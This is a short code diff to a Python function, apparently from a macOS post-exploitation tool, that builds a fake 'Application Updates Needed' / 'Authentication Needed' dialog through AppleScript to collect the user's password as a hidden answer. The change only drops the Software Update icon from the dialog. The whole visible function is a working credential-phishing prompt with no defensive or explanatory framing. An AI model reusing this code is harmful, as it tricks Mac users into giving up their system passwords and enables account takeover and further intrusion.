@@ -208,7 +208,7 @@ def addresses():
 def prompt():
     try:
         init = NSAlert.alloc().init()
-        s = NSAppleScript.alloc().initWithSource_("set popup to display dialog \"Application Updates Needed\" & return & return & \"Local macOS applications need permission to update\" & return default answer \"\" with icon file \"System:Library:CoreServices:Software Update.app:Contents:Resources:SoftwareUpdate.icns\"with title \"Authentication Needed\" with hidden answer")
+        s = NSAppleScript.alloc().initWithSource_("set popup to display dialog \"Application Updates Needed\" & return & return & \"Local macOS applications need permission to update\" & return default answer \"\" with title \"Authentication Needed\" with hidden answer")
         NSApp.setActivationPolicy_(1)
         NSApp.activateIgnoringOtherApps_(True)
         p = s.executeAndReturnError_(None)
